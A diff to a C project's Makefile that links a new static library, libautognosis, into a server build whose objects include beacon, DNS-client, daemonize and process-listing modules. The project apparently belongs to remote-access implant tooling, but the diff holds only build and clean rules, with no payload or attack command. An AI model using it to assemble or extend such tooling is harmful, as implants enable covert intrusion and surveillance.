@@ -73,7 +73,8 @@ OBJS =	beacon.o client_session.o compression.o daemonize.o dns_client.o decode_d
 #	get_data.o process_list.o netstat_an.o netstat_rn.o ifconfig.o compression.o \
 #	init_strings.o
 
-LIBS = $(LIBBZIP2) $(LIBCRYPTO) $(LIBSSL) $(LIBCRYPTO) $(LIBDEBUG)
+LIBAUTOGNOSIS = ../autognosis/libautognosis.a
+LIBS = $(LIBBZIP2) $(LIBCRYPTO) $(LIBSSL) $(LIBCRYPTO) $(LIBAUTOGNOSIS) $(LIBDEBUG)
 
 # Debug Configuration
 # 	LEVEL 1 -- optimization disabled, symbols only
@@ -196,13 +197,16 @@ $(LIBCRYPTO): $(CRYPTO_REBUILD)
 $(LIBDEBUG): $(DEBUG_REBUILD)
 	cd $(COMMON)/debug && $(MAKE) TARGET=$(TARGET)
 
+$(LIBAUTOGNOSIS):
+	cd ../autognosis && $(MAKE)
+
 .PHONY: debug
 debug: $(SERVER)-dbg
 
 .PHONY: release
 release: $(SERVER)
 
-$(SERVER): $(SERVER_REBUILD) $(LIBCRYPTO) proj_strings.h $(OBJS) $(LIBSSL) $(LIBBZIP2) $(STRINGS)/string_utils.o $(LIBDEBUG)
+$(SERVER): $(SERVER_REBUILD) $(LIBCRYPTO) proj_strings.h $(OBJS) $(LIBSSL) $(LIBBZIP2) $(STRINGS)/string_utils.o $(LIBAUTOGNOSIS) $(LIBDEBUG)
 	if ! test $(DEBUG); then \
 		printf "\tLD\t\t$@\n"; \
 		$(CC) $(CFLAGS) $(OBJS) $(LDFLAGS) $(STRINGS)/string_utils.o $(LIBS) -o $@; \
@@ -244,6 +248,7 @@ $(STRINGS)/string_utils.o:  $(STRINGS_REBUILD) $(STRINGS)/string_utils.h
 .PHONY: clean
 clean:
 	rm -f $(OBJS)
+	cd ../autognosis && $(MAKE) clean
 	>ARCH_BUILD
 
 .PHONY: md5
